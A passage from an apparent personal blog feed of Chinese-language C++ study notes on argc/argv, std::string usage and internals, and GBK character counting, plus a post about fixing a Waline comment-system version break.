可以是ping网址也可以pingIP地址，但是这俩参数都是不确定的，并且还有一些其他功能-t 持续ping之类的，这些都是不确定的。</p><p>在老的编译器那会，创建模板的时候main函数括号里是有两个形参的，这好像也是c语言规定的主函数的形参就俩</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * argc表示命令行的参数个数</span></span><br><span class="line"><span class="comment">     * argv表示有argc搁参数，[0]是以程序名开始，随后每多一个参数就一一匹配上。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不好理解的可以直接写段代码看看：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;argc=&quot;</span> &lt;&lt; argc &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; i++)&#123;</span><br><span class="line">        std::cout &lt;&lt; argv[i] &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/27/function/005.png" class=""><p>右击main函数打开所在文件夹，然后找到Debug目录下，不用看x64，如果你是x64编译的就去找x64下的debug。<br>进去之后看到这个项目名.exe程序，右击文件夹空白地方打开终端：</p><img src="/2022/05/27/function/006.png" class=""><p><code>.\执行程序 参数1 参数2 ......</code>参照这样执行，我记得这好像叫重定向。</p><blockquote><p>ps:之前linux玩多了，linux下执行的时候都是.&#x2F;xxx，而windows则相反.\可还行</p></blockquote><p><strong>然后印象里当初弄的时候好像第一个接受的参数应该是这个程序编译后的名称，但这里是显示一段较为完整的路径了，暂时没研究为什么，可能是不是在全局命令下执行的吧，就自然而然的带上了路径+执行程序名称</strong></p><p>argv就像一个数组制作的字符串，输入的参数会分配到一片连续的空间，并且以0结尾。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>函数的模板其实没啥好写的，用着用着就习惯了</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>string2</title>
      <link href="/2022/05/26/string2/"/>
      <url>/2022/05/26/string2/</url>
      
        <content type="html"><![CDATA[<h1 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h1><p>自认为不是一个努力的人……虽然这些20年在b站看过黑马的教程，甚至当时在本地也写过md的文件哈哈哈哈但是一段时间不用又落下了许多，也好在没有忘得一干二净吧……看到都能想起来，只是一些内置的方法会记不太清。回看也是两天看一点看一点，加上看视频又得自己做，然后顺便写在博客上，进度确实会慢一些。<br>而且数据结构这一门快打工了也还没掌握……还是很惭愧的,后面要尽量补齐了。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也回顾了string的一些方法，然后小结一下string</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>字符串之中除了指针，编码是一个无时不刻不会头疼的问题。<br>字符从存储：由表面的字符到计算机上的编码表，再到底层转换成二进制<br>读取字符串的顺序是存储的逆向顺序。</p><blockquote><p>常见的编码表：utf-8、utf-16、GBK、ASCII等</p></blockquote><hr><h2 id="自制能统计带中文的字符串"><a href="#自制能统计带中文的字符串" class="headerlink" title="自制能统计带中文的字符串"></a>自制能统计带中文的字符串</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjsp</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (*ch++ != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (*ch &lt; <span class="number">0</span>)&#123;</span><br><span class="line">n++;</span><br><span class="line">*ch++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是之前string回顾的时候做的一个小题目，因为gbk的情况下，中文占用两个字节，所以判断起来不一样。<br>代码目前不重要，重要的是一点，为什么要<code>*ch &lt; 0</code>。</p><p>1字节的范围是-128 - 127，如果是无符号就是0-255。<br>那么现在没有指定是无符号，所以按照-128 - 127算。<br>而ascii码的范围就是0-127，超过的就代表不是英文字符，且现在是有符号类型，所以是判断这个字符是不是&lt; 0，如果小于0就说明这个字符是中文；如果是无符号类型，就是判断这个字符是不是&gt; 127，如果大于127就说明这个字符是中文。</p><p>比如说<code>d5 c5</code>是中文张在gbk下的十六进制表现<br>d5拆分成二进制<code>1101 0101</code>,按照三码的规范，这其实就是个负数，那么在占用两个字节的前提下，读到一个字节十进制小于0，就可以跳过一个字节读了，也就是上述代码的写法。</p><p>当然也可用for循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tjsp</span><span class="params">(<span class="type">char</span> *ch)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; ch[i]; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ch[i] &lt; <span class="number">0</span>)</span><br><span class="line">            i++;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; n &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>string那会有个把数字转换成字符串的方法<code>std::to_string(number)</code>;<br>对应的也就产生了将字符串转化成数字</p><table><thead><tr><th>作用</th><th>语法</th><th>用法</th></tr></thead><tbody><tr><td>str转换成int</td><td>std::stoi(string)</td><td>int a &#x3D; stoi(“123”);</td></tr><tr><td>str转换成long</td><td>std::stol(string)</td><td>long a &#x3D; stol(“123”);</td></tr><tr><td>str转换成long long</td><td>std::stoll(string)</td><td>long long a &#x3D; stoll(“123”);</td></tr><tr><td>str转换成unsigned long</td><td>std::stoul(string)</td><td>unsigned long a &#x3D; stoul(“123”)</td></tr><tr><td>str转换成unsigned long long</td><td>std::stoull(string)</td><td>unsigned long long a &#x3D; stoull(“123”);</td></tr><tr><td>str转换成float</td><td>stof(string)</td><td>float a &#x3D; stof(“123”);</td></tr><tr><td>str转换成double</td><td>stod(string)</td><td>double a &#x3D; stod(“123”);</td></tr><tr><td>str转换成long double</td><td>stold(string)</td><td>long double a &#x3D; stold(“123”)</td></tr></tbody></table><blockquote><p>也是有规律的，sto+转换成的类型首字符</p></blockquote><hr><h2 id="stringstream流"><a href="#stringstream流" class="headerlink" title="stringstream流"></a>stringstream流</h2><p>在没有声明命名空间的时候，输入输出都是通过std::操作<br>在头文件sstream中有这么古怪玩意。。<code>std::stringstream</code><br><code>.str()会返回一个string</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::stringstream str;</span><br><span class="line">str &lt;&lt; <span class="string">&quot;hello &quot;</span> &lt;&lt; <span class="string">&quot;world&quot;</span>;</span><br><span class="line">std::string str1 = str.<span class="built_in">str</span>();</span><br></pre></td></tr></table></figure><p>打印str1的结果就是<code>hello world</code>;</p><blockquote><p>这个单独的string流感觉用的也少吧，毕竟代码需要可阅读性，大家都用的会更直观</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>无感-</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pointerString</title>
      <link href="/2022/05/26/pointerString/"/>
      <url>/2022/05/26/pointerString/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>C语言的字符串是通过数组实现的，数组本质上又和指针无二。<br>那么cpp的字符串底层是否跟C语言一致</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br></pre></td></tr></table></figure><p>在C语言里，ch现在就&#x3D; ch[0]; 象征着数组首地址。<br>但是string的构造我们还不清楚，所以通过编译器查看</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;str &lt;&lt; <span class="string">&quot;\n&quot;</span> &lt;&lt; &amp;str[<span class="number">0</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原本想通过这样直接输出的，但是cout好像优化掉了<code>&amp;str[0]</code>，得到的还是整个字符串的值。<br>那就粗暴点用C语言的printf指定格式输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>, &amp;str[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>结果是地址不同：<img src="/2022/05/26/pointerString/000.png" class=""></p><blockquote><p>其实使用string的时候需要引入头文件就该知道string不简单，它也属于容器的一种，底层是通过类实现的。</p></blockquote><p>再往后查看str[1]的地址：<img src="/2022/05/26/pointerString/001.png" class=""><br>发现str[0]和[1]直接相差1个字节，这才符合数组是由一个个char组成的。</p><hr><p>其次我们知道C语言的字符串长度是固定的，只有动态数组才能扩容，或者说合并数组时候需要用到一块新的内存空间，string虽然有重载的办法，但是底层也是八九不离十</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">str += <span class="string">&quot;! buhaolebuhaole&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;str[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给str扩容，看看地址会不会发生改变</p><img src="/2022/05/26/pointerString/002.png" class=""><p>发现只有这个所谓的str首地址没有改变，剩下的0和1都变了，且幅度有点大，有点跟我们之前比较栈区和堆区之间地址的差异。</p><hr><p>如果就只想看到字符串那一块的内存，可以使用c++11标准提供的两个函数</p><ul><li>.c_str()  得到一个const char*的指针，指向字符串的内存空间</li><li>.data()   得到一个const char*的指针，指向字符串的内存空间</li></ul><p>这么一看这俩方法好像是重复的，没有啥特别意义，所以在c++17标准之后统一了，只不过返回的只是个指针而不是常量指针了。</p><p>c++ 17标准</p><ul><li>.data() 得到的是个char*的指针了</li></ul><p>当我们定义一个常量指针接受str.c_str()时：</p><img src="/2022/05/26/pointerString/003.png" class=""><p>能看到cs指向的地址和str[0]是一致的。</p><blockquote><p>虽然.c_str()返回的是常量指针，但是如果我们想修改，还是可以通过强制转换实现，但是这种限定是很有必要的。个人没必要闲的蛋疼去玩。</p></blockquote><p><strong>且早期的之后string不要求数组以0结尾，因为string内置累加器，会自动记录长度，通过调用length方法获取。不像C语言的时候要区分strlen和sizeof的区别。但c++11之后还是要求了string也要以0结尾</strong></p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>主要就是区分string底层和char[]存在一定区别</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>walineError</title>
      <link href="/2022/05/26/walineError/"/>
      <url>/2022/05/26/walineError/</url>
      
        <content type="html"><![CDATA[<h1 id="整活"><a href="#整活" class="headerlink" title="整活"></a>整活</h1><p>预览的时候发现评论突然挂了</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/05/26/walineError/000.png" class=""><blockquote><p>说我的Waline未定义。。。我寻思我js文件都是用的官方模板怎么就没定义了。。<br>又上了一趟<code>vercel.com</code>发现也是一样控制台都是报错<code>Waline is not defined</code></p></blockquote><blockquote><p>就很离谱啊。。。但是waline官网的看着又是正常的，就只能上github看看有没有什么类似的情况<br>结果倒是有一个说clintv2不稳定的问题</p></blockquote><img src="/2022/05/26/walineError/001.png" class=""><blockquote><p>逆天。。上一秒waline的文档里面script还是cdn的地址<br>刷新一下又变成unpkg了<img src="/2022/05/26/walineError/003.png" class=""></p></blockquote><blockquote><p>主要是相比之前的我记得好像多了个这个link，然后其他版本以前也是没写的，这次都是@v2了。。很莫名其妙啊，要我说改动就不能大改。。或者好歹发邮件提示一下。</p></blockquote><blockquote><p>修改了下我这个主题的ejs文件之后</p></blockquote><img src="/2022/05/26/walineError/002.png" class=""><blockquote><p>评论是能看到了，版本直接跳到2.5.1了，但是之前评论的头像显示不出来控制台报错<code>net::ERR_CONNECTION_TIMED_OUT</code>….真是逆天。<br>但是官网文档的好像是2.5.2。。。就很迷惑行为。<br>而且我这里只能修改本地的配置，我在vercel那里还是访问不了，提示版本有问题未定义。。哎麻了</p></blockquote><blockquote><p>但是突然想起来vercel能重新部署，就试了一下</p></blockquote><img src="/2022/05/26/walineError/004.png" class=""><blockquote><p>找到这里点击那三个点，选择重新部署</p></blockquote><blockquote><p>重新部署要等一段时间，等待之后发现测试的地方能用了</p></blockquote><img src="/2022/05/26/walineError/006.png" class=""><blockquote><p>虽然控制台那里显示的server版本好像还是1.18.5</p></blockquote><img src="/2022/05/26/walineError/007.png" class=""><blockquote><p>在源代码那里也发现了应该是根据walineserver更新了，之前const waline &#x3D; Waline才报的错，现在是变成Waline.init了</p></blockquote><img src="/2022/05/26/walineError/008.png" class=""><blockquote><p>回到之前的评论下发现头像也出来了，甚至还多了个ip归属地。。。可还行</p></blockquote><img src="/2022/05/26/walineError/005.png" class=""><blockquote><p>只不过waline的版本还是2.5.1，官网的2.5.2都不知道是不是测试版的问题了。这一个小版本号倒是问题不大</p></blockquote><img src="/2022/05/26/walineError/009.png" class=""><blockquote><p>当你是管理员登录评论系统的时候你会发现能看到的好像更多了,还多了操作权限</p></blockquote><img src="/2022/05/26/walineError/010.png" class=""><blockquote><p>不信邪又去官网刷新了一下他的版本又变成1.6.1了？？？？？？合着我是撞他枪口上更新了？？？？</p></blockquote><img src="/2022/05/26/walineError/011.png" class=""><blockquote><p>快速上手那里也变了。。我真的服了啊.。。连最近编辑时间都改了可还行。。。</p></blockquote><img src="/2022/05/26/walineError/012.png" class=""><p>让我反复刷新一下。。。奶奶个腿他真的是大晚上更新啊</p><img src="/2022/05/26/walineError/013.png" class=""><p>这编辑时间又特么改成5.25日18点了，我特么信你的邪。。。老子26号一点刷来刷去你编辑时间写25的六点</p><p>哎反正先不管了。hexo s本地能预览成功就行。</p><hr><img src="/2022/05/26/walineError/014.png" class=""><p>按照作者的说法是官网文档本地缓存的问题。。。这倒也不是啥大事就是大改了自己要多留意，毕竟还是个有人 维护的项目。<br>不像下面那老哥，回答的都不知道啥玩意。。。之前都用的jsdelivr，作者也说有点小问题，你跟我说我自己cdn缓存持久。。。再说了之前用的时候也没刻意在script里@v2</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最近写的都存在本地了，网页的等哪天想上传仓库了再说吧。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>string1</title>
      <link href="/2022/05/24/string1/"/>
      <url>/2022/05/24/string1/</url>
      
        <content type="html"><![CDATA[<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><ul><li>std:string</li></ul><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>回忆过C语言版的字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch[] = <span class="string">&quot;abafjiafajif&quot;</span>;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">10</span>] = <span class="string">&quot;aaaaaaaa&quot;</span>;</span><br></pre></td></tr></table></figure><p>大致上一个意思，限定长度和不限定长度，不限定长度会自动根据初始化的值长度而定义。</p><p>其次就是拼接两个字符串</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> ch[<span class="number">10</span>] = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> ch1[<span class="number">10</span>] = <span class="string">&quot;5678&quot;</span>;</span><br><span class="line"><span class="type">char</span> ch2[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(ch2, ch, <span class="built_in">strlen</span>(ch));    <span class="comment">//先将ch从头拷贝进来</span></span><br><span class="line"><span class="built_in">memcpy</span>(ch2 + <span class="built_in">strlen</span>(ch), ch1, <span class="built_in">strlen</span>(ch1) + <span class="number">1</span>); <span class="comment">//在由从ch拷贝到ch2里</span></span><br></pre></td></tr></table></figure><p>这样拼接起来还是挺麻烦的，如果能直接相加赋给字符串就会相对方便了。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用string关键字前需包含头文件string，此外如果不想老是写std::string，就在下面加一句<code>using std::string;</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>定义起来格式就跟正常变量一样。输入输出相较于C语言类型的字符串的好处就是，不用提前声明大小，不用担心随便溢出。</p><p>此外string还可以指定只接受字符串的一部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str&#123; <span class="string">&quot;hello world&quot;</span> , <span class="number">5</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/000.png" class=""><p>除了从0开始，还能自定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = &#123; <span class="string">&quot;hello world&quot;</span> , <span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/001.png" class=""><p>能从指定的字符串获取，也就能从变量获取</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">std::cin &gt;&gt; str;</span><br><span class="line">string str1 = &#123; str,<span class="number">2</span>,<span class="number">5</span> &#125;;</span><br><span class="line">std::cout &lt;&lt; str1 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/002.png" class=""><p><strong>像比较之下方便了许多，但是这其实也就是官方封装好的，自己也能实现类似的效果</strong></p><blockquote><p>ps:对中文支持一般，因为字符集的不确定性，不能保证不同占用下带来的问题</p></blockquote><p>还有一种比较无聊的写法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">str</span><span class="params">(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>就是赋值了6个’a’组成的字符串。</p><p>然后回到拼接字符串，string可以直接通过相加实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">string str1;</span><br><span class="line">str1 = str + <span class="string">&quot;5678&quot;</span>;</span><br></pre></td></tr></table></figure><img src="/2022/05/24/string1/003.png" class=""><p>效果也是ok的。</p><blockquote><p>当然要求+的时候都是字符串，不能是字符串以外的东西</p></blockquote><p>如果想加一串数字，那也只能先将其转换成字符串。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="built_in">to_string</span>(<span class="number">123</span>);</span><br></pre></td></tr></table></figure><p>这样得到的str就是<code>“123”</code>，一个字符串类型的变量。</p><img src="/2022/05/24/string1/004.png" class=""><p>当然数字不单只是整型的，小数也可以。</p><hr><h2 id="加强"><a href="#加强" class="headerlink" title="加强"></a>加强</h2><p>字符串拼接存在一个问题，那就是参数不能都是常量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">str = <span class="string">&quot;123&quot;</span> + <span class="string">&quot;456&quot;</span>;</span><br></pre></td></tr></table></figure><p>这种情况下就会报错，原因是这两个常量“123”和“456”在计算机里还是char类型的<br>解决办法可以创建临时变量或者强转</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">str = (string)<span class="string">&quot;123&quot;</span> + <span class="string">&quot;456&quot;</span>; <span class="comment">//强制转换</span></span><br><span class="line">str = string&#123;<span class="string">&quot;123&quot;</span>&#125; + <span class="string">&quot;456&quot;</span>; <span class="comment">//创建临时string的变量</span></span><br></pre></td></tr></table></figure><p>如果使用<code>+=</code>操作符，那么也要注意类型转换，因为+的优先级高于+&#x3D;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">str = string&#123; <span class="string">&quot;123&quot;</span> &#125; + <span class="string">&quot;456&quot;</span> + <span class="string">&quot;789&quot;</span>;</span><br><span class="line">str += (string)<span class="string">&quot;hhh&quot;</span> + <span class="string">&quot;aaa&quot;</span>;   <span class="comment">//保持强制转换或者创建临时变量</span></span><br></pre></td></tr></table></figure><hr><h3 id="append"><a href="#append" class="headerlink" title="append"></a>append</h3><p>之前的拼接都是使用+号，还得额外创建一个变量，string本身提供了一种方法就是<code>append</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">str.<span class="built_in">append</span>(<span class="string">&quot;456&quot;</span>);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; str &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>同时append可以套娃<code>str.append(&quot;123&quot;).append(&quot;456&quot;).append(&quot;789&quot;).....</code><br>也可以截取<code>str.append(&quot;123456&quot;,3)</code>或者<code>str.append(&quot;123456&quot;,2,5)</code><br>也可以使用定义时的办法<code>str.append(6,&#39;a&#39;)</code></p><img src="/2022/05/24/string1/005.png" class=""><p>抛开使用中的一种，也就意味着append有七种参数方法。</p><hr><h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><p>字符串的截取方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">substr</span>(index,end); <span class="comment">//输入截取的起点和终点</span></span><br><span class="line">.<span class="built_in">substr</span>(index);     <span class="comment">//只输入一个数则表示截取起点，默认截取到最后</span></span><br></pre></td></tr></table></figure><p>substr会有一个返回值，返回的值就是截取后的字符串，可以用于赋值给其他字符串或者直接打印</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;0123456789&quot;</span>;</span><br><span class="line">string str1 = str.<span class="built_in">substr</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">std::cout &lt;&lt; str.<span class="built_in">substr</span>(<span class="number">1</span>,<span class="number">5</span>) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; str1 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>效果就是：<img src="/2022/05/24/string1/006.png" class=""></p><hr><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><p>C语言我们计算字符串长度使用<code>strlen</code>,cpp的string则也有计算长度的方法<code>length</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;0123456789&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; str.<span 